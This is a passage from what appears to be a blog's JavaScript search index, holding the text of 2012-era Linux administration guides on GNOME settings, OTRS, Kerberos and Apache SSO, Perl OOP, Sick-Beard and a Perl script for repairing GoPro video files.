text/html=firefox.desktop;chromium-browser.desktop; text/plain=leafpad.desktop;gvim.desktop; text/x-chdr=gvim.desktop; text/x-csrc=gvim.desktop; text/x-python=gvim.desktop; video/mp4=mplayer.desktop; video/mpeg=mplayer.desktop; video/quicktime=mplayer.desktop; video/webm=mplayer.desktop; video/x-flv=mplayer.desktop; video/x-matroska=mplayer.desktop; video/x-ms-wmv=mplayer.desktop; video/x-msvideo=mplayer.desktop; video/x-ogm+ogg=mplayer.desktop; x-scheme-handler/http=firefox.desktop;chromium-browser.desktop; x-scheme-handler/https=firefox.desktop;chromium-browser.desktop; x-scheme-handler/ftp=firefox.desktop;chromium-browser.desktop; x-scheme-handler/feed=thunderbird.desktop; x-scheme-handler/mailto=thunderbird.desktop; x-scheme-handler/news=thunderbird.desktop; x-scheme-handler/nntp=thunderbird.desktop; x-scheme-handler/snews=thunderbird.desktop; Add an Application linkIt’s possible to add an application to GNOME Shell that is not in the repositories. For example, I installed the latest version of Eclipse in /usr/share and I want to make the application visible in the list of available applications. Just create a file with this content (~/.local/share/applications/eclipse.desktop):\n[Desktop Entry] Categories=Development Comment=Eclipse Encoding=UTF-8 Exec=/usr/share/eclipse/eclipse GenericName=Eclipse Hidden=false # Icons: 64x64 png Icon=/usr/share/eclipse/icon.png Name=Eclipse Type=Application All you need to do is reload GNOME Shell (Alt+F2 - r - Enter).\nReferences linkhttp://gregcor.com/2011/05/07/fix-dual-monitors-in-gnome-3-aka-my-workspaces-are-broken/\nhttps://github.com/ssokolow/profile/blob/master/home/.local/share/applications/mimeapps.list ↩︎\n"
            }
        );
    index.add(
            {
                id:  293 ,
                href: "\/OTRS_:_mise_en_place_d\u0027un_outil_de_ticketing\/",
                title: "OTRS: Setting up a ticketing tool",
                description: "Guide for installing and configuring OTRS ticketing system on Debian 6 with PostgreSQL and LDAP integration",
                content: " Software version 2.4.14 Operating System Debian 6 Website OTRS Website Last Update 31/10/2012 Introduction linkOpen-source Ticket Request System (OTRS, literally “open source ticket request system”), is an open source software for customer relationship management or support service management. A company, organization or institution can use it to assign “tickets” to requests made via the help desk or troubleshooting service. This system facilitates the processing of support or troubleshooting requests and any requests made by phone or email. OTRS is distributed under GNU Affero General Public License.1\nFor the implementation of this version, I used the official documentation2 and made some small adjustments.\nPrerequisites linkCheck that your locales are correctly defined:\ndpkg-reconfigure locales Installation linkWe will need these packages:\naptitude install libapache2-mod-perl2 libdbd-pg-perl libnet-dns-perl libnet-ldap-perl libio-socket-ssl-perl libpdf-api2-perl libsoap-lite-perl libgd-text-perl libgd-graph-perl libapache-dbi-perl postgresql aspell aspell-en dbconfig-common dictionaries-common javascript-common libalgorithm-diff-perl libalgorithm-diff-xs-perl libaspell15 libauthen-sasl-perl libbit-vector-perl libcarp-clan-perl libcrypt-passwdmd5-perl libdate-pcalc-perl libemail-valid-perl libio-socket-inet6-perl libjs-prototype libjs-yui libmail-pop3client-perl libnet-domain-tld-perl libnet-imap-simple-perl libnet-imap-simple-ssl-perl libnet-smtp-ssl-perl libsocket6-per libtext-csv-perl libtext-csv-xs-perl libtext-diff-perl libxml-feedpp-perl libxml-treepp-perl procmail wwwconfig-common Note that I’m using PostgreSQL and not MySQL. Next, we install OTRS (I deliberately didn’t take the latest version, but you can do it without any worries):\nuseradd -r -d /opt/otrs/ -c 'OTRS user' otrs usermod -g www-data otrs cd /opt wget http://ftp.otrs.org/pub/otrs/otrs-2.4.14.tar.gz tar -xzf otrs-2.4.14.tar.gz rm -f otrs-2.4.14.tar.gz mv otrs-* otrs \u0026\u0026 cd otrs cp Kernel/Config.pm.dist Kernel/Config.pm cp Kernel/Config/GenericAgent.pm.dist Kernel/Config/GenericAgent.pm perl bin/SetPermissions.pl --otrs-user=otrs --otrs-group=otrs --web-user=www-data --web-group=www-data /opt/otrs Configuration linkApache linkWe’ll create this configuration in Apache:\n# -- # added for OTRS (http://otrs.org/) # $Id: apache2-httpd-new.include.conf,v 1.5 2008/11/10 11:08:55 ub Exp $ # -- # agent, admin and customer frontend ScriptAlias /otrs/ \"/opt/otrs/bin/cgi-bin/\" Alias /otrs-web/ \"/opt/otrs/var/httpd/htdocs/\" # if mod_perl is used # load all otrs modules Perlrequire /opt/otrs/scripts/apache2-perl-startup.pl # Apache::Reload - Reload Perl Modules when Changed on Disk PerlModule Apache2::Reload PerlInitHandler Apache2::Reload PerlModule Apache2::RequestRec # set mod_perl2 options ErrorDocument 403 /otrs/index.pl ErrorDocument 404 /otrs/index.pl SetHandler perl-script PerlResponseHandler ModPerl::Registry Options +ExecCGI +FollowSymLinks PerlOptions +ParseHeaders PerlOptions +SetupEnv Order allow,deny Allow from all # # RewriteEngine On # RewriteCond /usr/share/otrs/var/httpd/htdocs/maintenance.html -l # RewriteRule ^.*$ /otrs-web/maintenance.html # # directory settings "
            }
        );
    index.add(
            {
                id:  294 ,
                href: "\/Authentification_SSO_depuis_Apache_sur_backend_AD_via_Kerberos\/",
                title: "Apache SSO Authentication on AD Backend via Kerberos",
                description: "Learn how to implement Single Sign-On (SSO) authentication for Apache web applications with Kerberos and Active Directory backend.",
                content: " Software version 5 Operating System Red Hat 6 and Debian 6 Last Update 29/10/2012 Introduction linkThe purpose of this article is to explain how to implement strong SSO (Single Sign-On) authentication for a web application hosted on a local network Linux server with Apache via Kerberos on Windows 2003/2008 Server. Clients will be Windows or Linux machines participating in the AD (Active Directory) domain using a web browser.1\nWe can summarize the operation as follows: a user opens a session on the domain and navigates to a protected http page on the Intranet network. Usually, a box is displayed inviting the user to enter their username and password, even though they are already known to AD, since they entered the same information to connect to their Windows account. The purpose of Single Sign-On is to authenticate the user without them having to re-enter the same information multiple times.\nKerberos works with a system of tokens, which we will call ’tickets’. Authentication takes place in several steps:\nThe client workstation requests a ticket from the Kerberos server (here the Win2003 DC) The KDC returns a ticket, since the client is already identified on the network The client workstation formulates the request to the Web server including the ticket Several advantages of this method:\nThe user identifies themselves only once and can then transparently access different services The username and password are never transmitted over the network Prerequisites linkFor the rest of the article, I will assume that you have the following elements:\nA 2003 Server configured as a domain controller with DNS service enabled, and at least one user account (dc-1.local.domain) A Linux server with Apache configured, capable of serving pages (lx-1.local.domain) An XP or 2003 client registered on the domain, capable of opening a session with a domain account (pc-1.local.domain) warning Kerberos being particularly sensitive to machine names, it is important that all machines appear in the DNS server and that they all have a PTR (reverse DNS) entry equal to the forward DNS (A) entry. In addition to being sensitive to naming, Kerberos is sensitive to any time lag between different machines. To overcome this problem, I advise you to use an NTP service.\nFinally, you need to choose a Kerberos realm, for example LOCAL.DOMAIN. Note that the realm is written in all uppercase. It is not necessarily the domain name, and there can be several realms on a network with a single domain. However, the realm is written in uppercase, for example LOCAL.DOMAIN.\nwarning It is imperative that all your machines have the correct time, so connect them all to an NTP server. Installation linkWindows Server linkInstall the support tools2.\nLinux Server linkWe will install the following packages:\naptitude install krb5-clients krb5-config krb5-user libkrb53 libapache2-mod-auth-kerb Configuration linkWindows Active Directory linkFor each service to Kerberize, the following operations are to be planned to generate a Service Principal:\nCreation of a user account for each service. I advise you to choose a name that allows you to identify the service concerned, for example intranet-1 in the Active Directory. warning Do not choose a username that already exists as a domain controller name or as a computer name Generation of a KeyTab. This file is used to authenticate the Kerberized server (here the Web server) to the KDC: ktpass -princ HTTP/lx-1.local.domain@LOCAL.DOMAIN -crypto DES-CBC-MD5 -ptype KRB5_NT_PRINCIPAL -mapuser intranet-1 -pass azerty -out C:\\temp\\keytab.txt Copy the generated file to the Linux server in /etc/krb5.keytab.\nLinux Server linkStart by securing the keytab copied previously:\nchown www-data:root /etc/krb5.keytab chmod 640 /etc/krb5.keytab Configure DNS:\n# /etc/resolv.conf search local.domain nameserver 192.168.22.1 Verify that modauthkerb is activated:\na2enmod auth_kerb Create a .htaccess or edit apache2.conf to secure the site:\n# .htaccess "
            }
        );
    index.add(
            {
                id:  295 ,
                href: "\/La_programmation_orient%C3%A9e_objet_en_Perl\/",
                title: "Object-Oriented Programming in Perl",
                description: "A guide to understanding and implementing Object-Oriented Programming in Perl, including basic concepts and practical examples",
                content: " Software version 5.10 Website Perl Website Last Update 13/10/2012 Introduction linkObject-Oriented Programming (which we will refer to as OOP) is a concept with numerous universally recognized virtues today. It’s a programming method that helps improve application and software development and maintenance, with significant time savings. It’s important to keep in mind that it doesn’t reject structured (or procedural) programming since it’s built upon it. The classic approach to introducing OOP into an existing language is through encapsulation of existing functionality. The C++ language was built on C and brought OOP. The JAVA language is based on C++ syntax.\nPerl has also followed suit by offering extensions to give its fans the ability to use this programming paradigm. Nevertheless, Perl being permissive, it’s not as strict as “pure object” languages. But this is normal, as Perl’s philosophy is maintained, “there is more than one way to do it” (TIMTOWTDI).\nI was strongly inspired by this tutorial1, but I’ll only use a part of it for quick implementation. If you want a more condensed version that nevertheless requires good foundations, there is this one2.\nSimple Example linkLet’s start with a simple example including a module (because it’s mandatory) and we’ll see how to send information to it:\n(Personne.pm)\n# Nom du package, de notre classe package Personne; # Avertissement des messages d'erreurs use warnings; # Vérification des déclarations use strict; sub new { my ( $classe, $ref_arguments ) = @_; # Vérifions la classe $classe = ref($classe) || $classe; # Création de la référence anonyme d'un hachage vide (futur objet) my $this = {}; # Liaison de l'objet à la classe bless( $this, $classe ); $this-\u003e{_NOM} = $ref_arguments-\u003e{nom}; $this-\u003e{_PRENOM} = $ref_arguments-\u003e{prenom}; $this-\u003e{AGE} = $ref_arguments-\u003e{age}; $this-\u003e{_SEXE} = $ref_arguments-\u003e{sexe}; $this-\u003e{NOMBRE_ENFANT} = $ref_arguments-\u003e{nombre_enfant}; return $this; } # Méthode marcher - ne prend aucun argument sub marcher { my $this = shift; print \"[$this-\u003e{_NOM} $this-\u003e{_PRENOM}] marche\\n\"; return; } 1; # Important, à ne pas oublier __END__ # Le compilateur ne lira pas les lignes après elle And then you have your main program:\n(soft.pl)\n#!/usr/bin/perl use warnings; use strict; use Personne; my $Objet_Personne1 = Personne-\u003enew( { nom =\u003e 'Dupont', prenom =\u003e 'Jean', age =\u003e 45, sexe =\u003e 'M', nombre_enfant =\u003e 3, } ); References link http://djibril.developpez.com/tutoriels/perl/poo/ ↩︎\nhttp://woufeil.developpez.com/tutoriels/perl/poo/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  296 ,
                href: "\/Gnome-shell_:_changement_automatique_de_fond_d%27%C3%A9cran\/",
                title: "Gnome-shell: Automatic Wallpaper Change",
                description: "How to set up automatic wallpaper change in Gnome-shell using a simple script and optional tools like Nitrogen",
                content: " Software version 3.4.2 Operating System Debian 7 Website Gnome Website Last Update 07/10/2012 Introduction linkI couldn’t find a native function to regularly change wallpapers in Gnome-shell. That’s why I took inspiration from a small script and improved it.\nImplementation linkAll my wallpapers are in ~/Images. We’ll create a small script, which I put in /usr/bin but you can put it wherever you want:\n(/usr/bin/wallpaper-changer)\n#!/bin/bash IMAGES_FOLDER='/home/pmavro/Images' RANDOM_EVERY=1800 cd $IMAGES_FOLDER while [ 1 ] ; do random_num=`ls $IMAGES_FOLDER | sort -R | tail -n 1` # Gnome shell usage # gsettings set org.gnome.desktop.background picture-uri \"file:$IMAGES_FOLDER/$random_num\" # Nitrogen usage /usr/bin/nitrogen --set-scaled $IMAGES_FOLDER/$random_num # XFCE xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s $IMAGES_FOLDER/$random_num sleep $RANDOM_EVERY done Uncomment one of the 3 lines between Gnome Shell, XFCE or Nitrogen to choose the desired method.\nLet’s set the execution rights:\nchmod 755 /usr/bin/wallpaper-changer Then add an autostart to your session:\n(~/.config/autostart/wallpaper.desktop)\n[Desktop Entry] Name=wallpaper-changer Exec=/usr/bin/wallpaper-changer Comment=change wallpaper every so often Hidden=false Type=Application X-GNOME-Autostart-enabled=true Restart your session and you’re done :-)\nNitrogen linkIf you have multiple screens, you might want to have properly placed dual-screen wallpapers. For this, we’ll use the nitrogen utility:\naptitude install nitrogen Then, you must disable desktop icons if you want to use Nitrogen:\ngsettings set org.gnome.desktop.background show-desktop-icons false References linkhttp://superuser.com/questions/298050/periodically-changing-wallpaper-under-gnome-3\n"
            }
        );
    index.add(
            {
                id:  297 ,
                href: "\/Kerberos_:_Mise_en_place_d\u0027un_serveur_Kerberos\/",
                title: "Kerberos: Setting up a Kerberos Server",
                description: "A comprehensive guide on setting up Kerberos authentication server on Linux, configuring clients and system authentication using PAM.",
                content: " Software version 5 Operating System Red Hat 6\nDebian 6 Last Update 06/10/2012 Introduction linkKerberos is a network authentication protocol that relies on a secret key mechanism (symmetric encryption) and the use of tickets, rather than clear text passwords, thus avoiding the risk of fraudulent interception of user passwords. Created at the Massachusetts Institute of Technology (MIT), it bears the Greek name for Cerberus, guardian of the Underworld. Kerberos was first implemented on Unix systems.\nIn a simple network using Kerberos, several entities are distinguished:\nThe client (C) has its own secret key Kc The server (S) also has a secret key Ks The ticket-granting service (TGS) has a secret key KTGS and knows the secret key KS of the server The key distribution center (KDC) knows the secret keys KC and KTGS Client C wants to access a service offered by server S.\n1\nWe will first see how to set up a Kerberos server under GNU/Linux. Then in the second part, we will look at client configuration and system authentication via PAM.\nServer Installation linkTo install Kerberos:\naptitude install krb5-kdc krb5-admin-server Server Configuration linkThe krb5.conf file will need to be configured on all clients. It indicates the different realms and their respective KDC (Key Distribution Center = Kerberos server). Edit /etc/krb5.conf and adapt to your configuration:\n[libdefaults] default_realm = EXAMPLE.COM ... [realms] EXAMPLE.COM = { kdc = localhost admin_server = localhost default_domain = example.com } ... [domain_realm] .example.com = EXAMPLE.COM example.com = EXAMPLE.COM ... The kdc.conf file contains the Kerberos server configuration:\n[realms] EXMAPLE.COM = { ... } Creating the Kerberos Database linkThe creation of the Kerberos database is done via the following command (the -s option allows storage in a file):\nkdb5_util create -s The password requested here will be used to encrypt the database. From now on, we can verify access to the KDC via the kadmin.local command. This is identical to the kadmin command but bypasses the root ACLs (local use only).\nkadmin.local Creating Accounts linkWe can already check the main accounts created by default:\nkadmin.local: listprincs K/M@EXAMPLE.COM kadmin/admin@EXAMPLE.COM kadmin/changepw@EXAMPLE.COM kadmin/history@EXAMPLE.COM krbtgt/EXAMPLE.COM@EXAMPLE.COM User creation is done via the ank command: Add New key\nkadmin.local: ank admin/admin The key must then be stored in a special file called keytab:\nkadmin.local: ktadd -k /etc/krb5kdc/kadm5.keytab kadmin/admin kadmin/changepw The file /etc/krb5kdc/kadm5.keytab should now contain the corresponding keys.\nFinally, set up ACLs to give all privileges to accounts with an admin instance. Edit /etc/krb5kdc/kadm5.acl:\n*/admin@EXAMPLE.COM * Server Launch linkStart the server as follows:\n/etc/init.d/krb5-admin-server restart /etc/init.d/krb5-kdc restart Client Installation link apt-get install libpam-krb5 krb5-user Client Configuration linkCopy the /etc/krb5.conf file from the server.\nTests linkTo test that everything works correctly, you should be able to perform the following sequence:\nObtaining a ticket for the admin principal:\n$ kinit admin/admin@EXAMPLE.COM Password for admin/admin@EXAMPLE.COM: Display of current tickets:\n$ klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: admin/admin@EXAMPLE.COM Valid starting Expires Service principal 06/07/06 11:53:47 06/07/06 21:53:11 krbtgt/EXAMPLE.COM@EXAMPLE.COM Destroying the ticket:\nkdestroy Setting up System Authentication linkPAM Configuration linkOn the client, we will use PAM. To do this, add the following lines to the different files. Edit the file /etc/pam.d/common-auth:\nauth sufficient pam_krb5.so use_first_pass Edit /etc/pam.d/common-account:\naccount [default=bad success=ok user_unknown=ignore service_err=ignore system_err=ignore] pam_krb5.so Edit /etc/pam.d/common-password:\npassword sufficient pam_krb5.so use_authtok Edit /etc/pam.d/common-session:\nsession optional pam_krb5.so Adding a User linkOn the server, create a user named olivier:\nkadmin kadmin: ank olivier Now we can do:\nkinit olivier@EXAMPLE.COM Let’s now create the user olivier on the client:\nuseradd olivier Edit the /etc/shadow file:\nolivier:*K*:13306:0:99999:7::: The encrypted password here, K, is used to indicate that the password comes from Kerberos.\nTest linkFrom a third machine, SSH to the Kerberos client:\nssh olivier@client By doing a tail -f /var/log/auth.log on the server, you should get:\nJun 8 10:24:03 192.168.5.7 sshd[18175]: (pam_unix) check pass; user unknown Jun 8 10:24:03 192.168.5.7 sshd[18175]: (pam_unix) authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=*** Jun 8 10:24:03 ldapserver krb5kdc[602]: AS_REQ (7 etypes {18 17 16 23 1 3 2}) 192.168.5.7: NEEDED_PREAUTH: olivier@EXAMPLE.COM for krbtgt/EXAMPLE.COM@EXAMPLE.COM, Additional pre-authentication required Jun 8 10:24:03 ldapserver krb5kdc[602]: AS_REQ (7 etypes {18 17 16 23 1 3 2}) 192.168.5.7: ISSUE: authtime 1149755043, etypes {rep=16 tkt=16 ses=16}, olivier@EXAMPLE.COM for krbtgt/EXAMPLE.COM@EXAMPLE.COM Jun 8 10:24:03 192.168.5.7 sshd[18175]: Accepted keyboard-interactive/pam for olivier from 192.168.5.55 port 39932 ssh2 Jun 8 10:24:03 192.168.5.7 sshd[14434]: (pam_unix) session opened for user olivier by (uid=0) References link http://fr.wikipedia.org/wiki/Kerberos ↩︎\n"
            }
        );
    index.add(
            {
                id:  298 ,
                href: "\/Introduction_au_XHTML\/",
                title: "Introduction to XHTML",
                description: "This guide provides an introduction to XHTML, including the basics of tags, comments, minimal structure, and advanced features such as video tags.",
                content: "Introduction linkXHTML is a markup language used for writing World Wide Web pages. Originally designed as the successor to HTML, XHTML is based on the syntax defined by XML, which is more recent and simpler than the syntax defined by SGML on which HTML is based.\nLike many XML-based languages, XHTML begins with the letter X, which represents the word “extensible”. Thus, the first document officially describing XHTML is called “XHTML™ 1.0 The Extensible HyperText Markup Language”. However, the abbreviation XHTML is a trademark of the World Wide Web Consortium (W3C) and is the only one used in the specifications that followed version 1.0.\nTags linkA tag is a keyword surrounded by angle brackets \u003c and \u003e. XHTML requires that all tags be written in lowercase. Tags always work in pairs: an opening tag and a closing tag. The two tags will transform everything between them. And, like every rule, this one has its exceptions… There are indeed some that prefer solitude… They can be recognized by the / just before the closing bracket. An example with the following tag, which allows a line break:\nSome tags take what are called arguments or attributes. These are actually additional parameters that allow for a little more variety in color choices, position on the page, etc… They are always placed before the closing angle bracket of the opening tag.\nExample:\nThis is the tag indicating the beginning of the body of the page; this tag sets a black background on the page.\nComments linkComments are pieces of code that will not be interpreted by the browser. Let’s imagine that several people are working on a site. It is highly likely that each person will program a piece of page in their own corner, and that the parts will be combined later. But if there is a problem and someone asks for help, they will need to understand the code! So, adding some indications can only be useful. To write comments in XHTML, there is a tag specially designed for the occasion. It is quite particular, because besides being a solitary tag, it is written in its own way:\nMinimal Structure linkLet’s finally begin:\n\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"\u003e My first Web page This is the body of my page! Explanations link First of all, you need to write a rather intimidating line: \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"\u003e This line makes it known that we are using the XHTML language, version 1.1. This is the most recent version to date, I believe (as of June 1st, 2005).\nBy declaring this DocType, we indicate to the Internet browser that we know the Web standards, and that we are going to use them. Thus, it will interpret all the code very rigorously. In this way, the page will respect the various standards in force, and the display of the page will be the same everywhere. If we don’t include it, each browser will try to understand the code in its own way, and variations may be seen depending on the browser used. Hence the importance of this line!\nThen the line: (don't forget the that closes it!!) Here, we are retrieving everything we need to program in XHTML from the W3C (World Wide Web Consortium) site. This is the international organization that sets the rules and standards in force on the Web.\nThe first argument indicates the namespace to use. It’s a link to a W3C page that defines the different keywords of the language.\nThe second argument is the language of the pages. In this case, it will be a French page (value fr). For an English page, you will need to put en, for an Italian page it, etc… This is useful to increase the accessibility of pages: search engines will know what the language of the site is, which will allow for better referencing.\nThe third argument is not normally mandatory, but it is advised to include it in order to make the pages compatible with older browsers, which are not yet up to date with Internet standards (isn’t that right, IE?).\nTags and The head area concerns everything that is not on the page itself. It concerns everything around it: in the browser’s title bar, in the status bar, etc. For info:\nMy first Web page This is the message in the browser’s title bar.\nTags and The body of the page will contain everything that should be displayed on the page, in the main area of the browser.\nVideo Tags linkVideo tags appeared with HTML5. There are quite a few drawbacks regarding video formats for each browser. In short, to make everyone agree, we can embed several video formats within the same video tag. A bit complicated? Let’s go with an example:\nInternet Explorer is not up to standard to read this video, use instead Firefox Line 1: The OGV format is used for videos that can be played with Firefox. Use this preferably because it’s free and open source. No need to pay anything in terms of licenses. Line 2: The mp4 format is proprietary, but recognized by browsers other than Firefox. Line 3: More mp4 but this time with modified dimensions so that the video can be played on iPhone (480x320) Line 4: This line indicates to IE users that this awful mess still doesn’t read videos in HTML5 format. Coincidentally, it’s the last browser not to have these features! A Loading Page in HTML linkHere’s a subtle way to use only HTML for a loading page with just a div and innerHTML. I found this solution here. So here’s a simple form with the ‘Submit’ button that will take the desired text once clicked:\nother fields References link https://forums.digitalpoint.com/showthread.php?t=16341 "
            }
        );
    index.add(
            {
                id:  299 ,
                href: "\/Sick-Beard_:_Un_PVR_s\u0027appuyant_sur_SABnzbd\/",
                title: "Sick-Beard: A PVR Relying on SABnzbd",
                description: "This guide explains how to install and configure Sick-Beard, a PVR tool that works with SABnzbd to easily manage TV series episodes on Debian systems.",
                content: " Software version 830b3b1 Operating System Debian 7 Website Sick-Beard Website Last Update 26/09/2012 Introduction linkThis tool relies on SABnzbd and allows for easy management of TV series episodes.\nInstallation linkTo install it, we need the following package:\naptitude install python-cheetah Then we install Sick-Beard:\ncd /tmp wget -O sickbeard.tgz \"https://nodeload.github.com/midgetspy/Sick-Beard/tarball/master\" tar -xzf sickbeard.tgz -C /usr/share/ mv /usr/share/midgetspy-Sick-Beard-* /usr/share/sick-beard chown -Rf www-data. /usr/share/sick-beard/ And set up the init file:\ncp /usr/share/sick-beard/init.ubuntu /etc/init.d/sickbeard update-rc.d sickbeard defaults Configuration linkWe’ll use a configuration file for default values:\n# SickBeard configuration SB_USER=www-data SB_HOME=/usr/share/sick-beard SB_DATA=/usr/share/sick-beard SB_OPTS=/usr/share/sick-beard/config.ini You can then start the service:\n\u003e /etc/init.d/sickbeard start Removing stale /var/run/sickbeard/sickbeard.pid Starting SickBeard Apache Redirection linkYou might want to have a simple URL for using this service, so let’s create our configuration (/etc/apache2/sites-enabled/000-default):\nServerAdmin webmaster@localhost DocumentRoot /var/www Options FollowSymLinks AllowOverride None Options Indexes FollowSymLinks MultiViews AllowOverride None Order allow,deny allow from all ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ "
            }
        );
    index.add(
            {
                id:  300 ,
                href: "\/R%C3%A9parer_une_video_d%27une_GoPro_Hero\/",
                title: "Repairing a GoPro Hero Video",
                description: "How to repair a corrupted GoPro Hero video file and recover the video content without audio.",
                content: " {\u003c table “table-hover table-striped” \u003e}\nOperating System Mac OS X\nLinux Website GoPro Website Last Update 12/09/2012 {\u003c /table \u003e} Introduction linkIf you have a GoPro camera or another device that records MP4 videos and for some unexpected reason your video is corrupted for various reasons, it’s possible to recover the video without sound! It’s not ideal, but it’s better than losing everything.\nFirst, reinsert the card into the device and see if it can repair it by itself. An SOS message will appear, press any other button to let it attempt the repair. If it doesn’t work… continue with the following steps.\nPrerequisites linkYou will need:\nPerl (\u003e= 5.8) A repair script1 Repair Script linkHere is the downloadable version above, but if you want to see its content:\n(fix.pl)\n#!/usr/bin/perl my $infile = shift(@ARGV); my $outfile = $infile . \".restore.mp4\"; my $ctts_offset=0; my $width = 1280; my $height = 720; my $framerate = 25; my $i, $val; # # Parse command line options for options # for($i=0; $i\u003c@ARGV; $i++) { if ($ARGV[$i] =~ /-ctts/) { $ctts_offset = $ARGV[++$i]; } if ($ARGV[$i] =~ /-reso/){ $val = $ARGV[++$i]; if ($val eq '720p30' || $val eq 'ntscr2') { $width = 1280; $height = 720; $framerate = 30; } elsif ($val eq '720p60' || $val eq 'ntscr3') { $width = 1280; $height = 720; $framerate = 60; } elsif ($val eq '960p30' || $val eq 'ntscr4') { $width = 1280; $height = 960; $framerate = 30; } elsif ($val eq '1080p30' || $val eq 'ntscr5') { $width = 1920; $height = 1080; $framerate = 30; } elsif ($val eq '480p60' || $val eq 'ntscr1') { $width = 848; $height = 480; $framerate = 60; } elsif ($val eq '720p60' || $val eq 'palr3') { $width = 1280; $height = 720; $framerate = 50; } elsif ($val eq '960p30' || $val eq 'palr4') { $width = 1280; $height = 960; $framerate = 25; } elsif ($val eq '1080p30' || $val eq 'palr5') { $width = 1920; $height = 1080; $framerate = 25; } elsif ($val eq '480p60' || $val eq 'palr1') { $width = 848; $height = 480; $framerate = 50; } elsif ($val eq '720p30' || $val eq 'palr2') { $width = 1280; $height = 720; $framerate = 25; } elsif ($val eq '960p48' || $val eq '96048HD2') { $width = 1280; $height = 960; $framerate = 48;\t} else { printf(\"Error - resolution $val not supported. Trying default \".$height.\"p\".\"$framerate\\n\"); } } } open INFILE, \"\u003c\", $infile or die(\"Cannot open $infile for reading\\n\"); binmode INFILE; print (\"\\nAttempting to fix $infile\\n\\n\"); #disable screen buffering $|=1; # # read data section, find video frames # my $n, $size, $type, $buff, $framecount, @ptrs, @szs, $offset, $pmdat; # # Skip looking for mdat, find frames by brute force # $framecount = 0; #set delimiter to look for 6-byte value indicating AVC frame start $/ = pack (\"C*\", (0x00, 0x00, 0x00, 0x02, 0x09)); printf(\"Found frame at \"); while ($buff = ) { printf(\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b%06d at %08x\", $framecount, (tell INFILE) - 5); $ptrs[$framecount] = (tell INFILE)-5; #adjust to start of code if ($framecount \u003e 0) { $szs[$framecount-1] = $ptrs[$framecount] - $ptrs[$framecount-1]; #print (\"size: \".$szs[$framecount-1].\" \\n\"); } $framecount++; } # throw away last one since it triggered on EOF $framecount--; pop(@ptrs); #set beginning of mdat pointer based on 1st found frame $pmdat=$ptrs[0]-8; if ($framecount == 0){ printf(\"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\"); printf(\"No frames found. Quitting. \\n\"); close INFILE; exit; } else { print (\"\\n\"); } open OUTFILE, \"\u003e\", $outfile or die(\"Cannot open $outfile for writing\\n\"); binmode OUTFILE; print (\"Opened file $outfile for writing\\n\\n\"); $min=0xffffffff; $max=0x0; foreach(@szs){ if ($_ \u003e $max) {$max = $_} if ($_ \u003c $min) {$min = $_} } printf(\"Found %d (%x) frames, or approx %ds of video at %dfps\\n\", $framecount, $framecount, $framecount / $framerate, $framerate); printf(\" min size %x, max size %x\\n\", $min, $max); printf(\" from %x, to %x\\n\", $ptrs[0], $ptrs[$framecount-1]); # # Rebuild Header # my $hdrsize, $i, $moov, $stbl ; #calculate size #17 B per frame V, 17 Bpf A, plus overhead $hdrsize = (34 * $framecount) + 2500; $hdrsize = int ($hdrsize / 0x8000) + 1; if ($hdrsize % 2 == 0) { $hdrsize ++; # always make header size an odd multiple of 0x8000 } $hdrsize = $hdrsize * 0x8000; # calculate adjustment for new header size $offset = $hdrsize - $pmdat ; printf(\"Calculated header size of 0x%x \\n\",$hdrsize); printf(\"Using ctts offset of $ctts_offset\\n\"); printf(\"Using $width x $height @ $framerate fps\\n\"); # ftyp print OUTFILE pack(\"NA4A4NA4A4NN\",0x20,'ftyp','avc1',0,'avc1','isom',0,0); #stbl $stbl = pack (\"NA4NN\",0xf9,'stsd',0,0x01); $stbl .= pack (\"NA4NNNNNNnnNNNCCCA21C11CCC\",0xe9,'avc1',0,1,0,0,0,0,$width,$height,0x480000,0x480000,0,0,1,0x15,'Ambarella AVC encoder',0,0,0,0,0,0,0,0,0,0,0,0x18,0xff,0xff); $stbl .= pack (\"NA4NN\",0x10,'pasp',0,0); $stbl .= pack (\"NA4N8\",0x28,'clap',$width,1,$height,1,0,1,0,1); if ($height == 1080) { $stbl .= pack (\"NA4N15C3\",0x47,'avcC',0x014d0028,0xffe10030,0x274d0028,0x9a6280f0,0x044fcb80,0x8800001f,0x48000753,0x07430005, 0xb8e00019,0xbfd5de5c,0x686000b7,0x1c000337,0xfabbcb87,0xc2211458,0x01000428,0xee,0x3c,0x80); } elsif ($height == 480) { $stbl .= pack (\"NA4N15C3\",0x47,'avcC',0x014d401e,0xffe10030,0x274d401e,0x9a6281a8,0x7b602200,0x7d200,0x03a981d0,0x8007a180, 0x0044aa57,0x7971a100,0x0f430000,0x8954aef2,0xe1f08845,0x16000000,0x01000428,0xee,0x3c,0x80); } elsif ($height == 960) { $stbl .= pack (\"NA4N15C3\",0x47,'avcC',0x014d0028,0xffe10030,0x274d0028,0x9a6280a0,0x0f360220,0x7d20,0x1d4c1d,0x0c0016e3, 0x800066ff,0x577971a1,0x8002dc70,0x000cdfea,0xef2e1f08,0x84516000,0x01000428,0xee,0x3c,0x80); } else { $stbl .= pack (\"NA4N15C3\",0x47,'avcC',0x014d0028,0xffe10030,0x274d0028,0x9a6280a0,0x0b760220,0x7d20,0x1d4c1d,0x0c003d0a, 0x0112a9,0x5de5c686,0x1e8500,0x8954ae,0xf2e1f088,0x451e0000,0x01000428,0xee,0x3c,0x80); } $stbl .= pack (\"NA4N3\",0x14,'btrt',0,0,0); $stbl .= pack (\"NA4N4\",0x18,'stts',0,1,$framecount,90090/$framerate); $stbl .= pack (\"NA4NN\",8*$framecount + 0x10, 'ctts', 0, $framecount); if ($height == 1080) { for ($i=0;$i \u003c $framecount;$i++){ $stbl .= pack (\"NN\",1,0x0bbb); } } elsif ( $framerate == 60) { for ($i=$ctts_offset;$i \u003c $framecount + $ctts_offset;$i++){ if (($i 